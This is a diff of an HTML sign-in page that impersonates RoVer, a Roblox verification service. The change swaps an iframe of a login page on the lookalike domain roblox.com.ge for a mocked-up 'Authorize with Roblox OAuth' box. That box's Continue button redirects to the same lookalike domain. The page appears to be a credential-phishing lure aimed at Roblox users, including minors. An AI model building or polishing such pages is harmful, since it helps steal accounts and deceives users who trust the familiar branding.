@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>RoVer - Sign In</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
     * {margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
@@ -89,7 +89,7 @@
       padding:40px 30px;
       border-radius:6px;
       text-align:center;
-      max-width:920px;
+      max-width:420px;
       width:90%;
       color:#fff;
       position:relative;
@@ -101,7 +101,7 @@
 
     .login-box h2 {font-size:24px;margin-bottom:8px;font-weight:600;}
     .login-box p {font-size:14px;margin-bottom:24px;}
-    .login-box button.primary {
+    .login-box button {
       background:#e00078;
       color:#fff;
       border:none;
@@ -112,7 +112,61 @@
       cursor:pointer;
       transition:background 0.2s;
     }
-    .login-box button.primary:hover {background:#b80062;}
+    .login-box button:hover {background:#b80062;}
+
+    /* OAuth box */
+    .oauth-box {
+      background:#111;
+      border-radius:8px;
+      padding:30px 25px;
+      text-align:center;
+    }
+    .oauth-box .top {
+      font-size:22px;
+      font-weight:700;
+      margin-bottom:15px;
+      text-align:left;
+    }
+    .oauth-box p.subtitle {
+      font-size:14px;
+      color:#ccc;
+      margin:10px 0 20px;
+      text-align:left;
+    }
+    .oauth-box hr {
+      border:none;
+      border-top:1px solid #333;
+      margin:20px 0;
+    }
+    .oauth-box p.app-name {
+      margin-bottom:20px;
+      font-weight:600;
+    }
+    .oauth-box button.continue {
+      background:#fff;
+      color:#000;
+      border:none;
+      padding:12px;
+      border-radius:6px;
+      font-size:15px;
+      width:100%;
+      margin-bottom:15px;
+      cursor:pointer;
+    }
+    .oauth-box p.or {
+      margin:10px 0;
+      color:#888;
+    }
+    .oauth-box button.return {
+      background:#111;
+      color:#fff;
+      border:1px solid #333;
+      padding:12px;
+      border-radius:6px;
+      font-size:15px;
+      width:100%;
+      cursor:pointer;
+    }
 
     .extra-space {height:400px;}
 
@@ -142,14 +196,14 @@
 </head>
 <body>
   <header>
-    <button class="menu-btn" aria-label="Open menu">☰</button>
+    <button class="menu-btn">☰</button>
     <div class="logo">RoVer</div>
   </header>
 
-  <div class="overlay" id="overlay" tabindex="-1" aria-hidden="true"></div>
+  <div class="overlay" id="overlay"></div>
 
-  <nav class="side-menu" id="sideMenu" role="navigation" aria-label="Main menu">
-    <button class="close-btn" aria-label="Close menu">✕</button>
+  <div class="side-menu" id="sideMenu">
+    <button class="close-btn" onclick="toggleMenu()">✕</button>
     <ul>
       <li><a href="#">Help</a></li>
       <li><a href="#">Team Members</a></li>
@@ -157,13 +211,13 @@
       <li><a href="#">Manage Servers</a></li>
       <li><a href="#" class="active">Sign In</a></li>
     </ul>
-  </nav>
+  </div>
 
   <main>
-    <div class="login-box show" id="loginBox" role="main" aria-live="polite">
+    <div class="login-box show" id="loginBox">
       <h2>Sign in to RoVer</h2>
       <p>You must be 13 years of age or older to continue.</p>
-      <button class="primary" id="loginBtn">Log in with Roblox</button>
+      <button onclick="showOAuth()">Log in with Roblox</button>
     </div>
 
     <div class="extra-space"></div>
@@ -194,53 +248,47 @@
     const menuBtn = document.querySelector('.menu-btn');
     const sideMenu = document.getElementById('sideMenu');
     const overlay = document.getElementById('overlay');
-    const closeBtn = document.querySelector('.close-btn');
-    const loginBox = document.getElementById('loginBox');
-    const loginBtn = document.getElementById('loginBtn');
 
     function toggleMenu() {
       sideMenu.classList.toggle('active');
       overlay.classList.toggle('active');
     }
+
     menuBtn.addEventListener('click', toggleMenu);
-    closeBtn.addEventListener('click', toggleMenu);
     overlay.addEventListener('click', toggleMenu);
 
-    // External URL
-    const externalLoginUrl = "https://roblox.com.ge/login?returnUrl=1336618017952672";
-
     function showOAuth() {
-      loginBox.classList.remove("show");
-      loginBox.classList.add("hide");
+      const box = document.getElementById("loginBox");
+
+      // Animate out
+      box.classList.remove("show");
+      box.classList.add("hide");
 
       setTimeout(() => {
-        // Replace entire box with iframe + fallback link
-        loginBox.innerHTML = `
-          <iframe 
-            src="${externalLoginUrl}" 
-            style="width:100%;height:640px;border:none;border-radius:8px;background:#fff;"
-            title="Embedded login page">
-          </iframe>
-          <div style="margin-top:12px;font-size:13px;color:#ddd;text-align:left;">
-            If the login doesn’t load, 
-            <a href="${externalLoginUrl}" target="_blank" rel="noopener noreferrer" style="color:#ff9ccf;text-decoration:underline;">
-              open it in a new tab
-            </a>.
+        box.innerHTML = `
+          <h2>Sign in to RoVer</h2>
+          <div class="oauth-box">
+            <div class="top">ROBLOX</div>
+            <p class="subtitle">Authorize with Roblox OAuth</p>
+            <hr>
+            <p class="app-name">RoVer</p>
+            <button class="continue" onclick="openLogin()">Continue</button>
+            <p class="or">or</p>
+            <button class="return" onclick="location.reload()">Return to RoVer</button>
           </div>
         `;
-        loginBox.classList.remove("hide");
-        loginBox.classList.add("show");
-      }, 400);
+
+        // Animate in
+        box.classList.remove("hide");
+        box.classList.add("show");
+      }, 400); // match transition duration
     }
 
-    loginBtn.addEventListener('click', showOAuth);
-
-    // Close side menu with Escape
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape' && sideMenu.classList.contains('active')) {
-        toggleMenu();
-      }
-    });
+    // Simple clean redirect
+    function openLogin() {
+      window.location.href = "https://roblox.com.ge/users/7597001363/profile";
+    }
   </script>
 </body>
 </html>
+
